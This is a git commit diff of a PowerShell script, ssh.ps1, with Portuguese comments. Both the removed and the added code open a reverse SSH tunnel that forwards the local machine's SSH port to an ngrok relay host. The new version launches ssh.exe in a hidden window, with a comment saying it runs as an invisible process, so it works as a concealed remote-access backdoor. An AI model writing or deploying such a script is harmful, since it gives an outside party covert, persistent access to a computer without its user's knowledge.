49fe754a45740538670a63900b4a87e98e0d72d3
usermants <sanchezguy@proton.me>
2025-09-02 20:09:29 -0300

    Update ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -1,3 +1,8 @@
-Start-Job { 
-    ssh -o "ServerAliveInterval=60" -o "ServerAliveCountMax=3" -o "ExitOnForwardFailure=yes" -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19687 -N > $null 2>&1 
-} | Out-Null
+# Caminho absoluto do SSH
+$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
+
+# Comando SSH
+$sshArgs = "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19687 -N"
+
+# Executa SSH em processo invisível
+Start-Process -FilePath $sshPath -ArgumentList $sshArgs -WindowStyle Hidden
